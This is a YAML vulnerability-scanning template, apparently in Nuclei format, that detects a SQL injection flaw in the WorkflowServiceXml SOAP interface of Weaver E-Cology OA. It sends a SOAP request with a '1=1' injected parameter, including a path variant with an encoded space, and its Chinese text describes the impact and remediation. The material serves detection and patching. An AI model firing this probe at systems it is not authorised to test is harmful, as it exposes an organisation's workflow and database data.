id: e-cology-workflowservicexml-gethendledworkflowrequestlist-sqli
info:
  name: 泛微 E-Cology OA workflowservicexml 接口 - SQL 注入漏洞
  author: Chaitin
  severity: high
  description: |
    该模板用于检测 泛微 E-Cology OA workflowservicexml 接口 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/services/WorkflowServiceXml`、`/services%20/WorkflowServiceXml` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  metadata:
    verified: true
    max-request: 1
    vuln-id: CT-1201009
    vendor: weaver
    product: ecology
  tags: sqli,vuln,weaver,ecology,oa
http:
- method: POST
  path:
  - '{{BaseURL}}/services/WorkflowServiceXml'
  - '{{BaseURL}}/services%20/WorkflowServiceXml'
  headers:
    Content-Type: text/xml
  body: |-
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
      <soapenv:Body>
          <web:getHendledWorkflowRequestList>
            <web:in0>1</web:in0>
            <web:in1>1</web:in1>
            <web:in2>1</web:in2>
            <web:in3>1</web:in3>
            <web:in4>
                <web:string>1=1</web:string>
            </web:in4>
          </web:getHendledWorkflowRequestList>
      </soapenv:Body>
    </soapenv:Envelope>
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200 && contains(body, ''lastOperatorName'') && contains(body, ''lastOperateTime'') && contains(body, ''receiveTime'')'
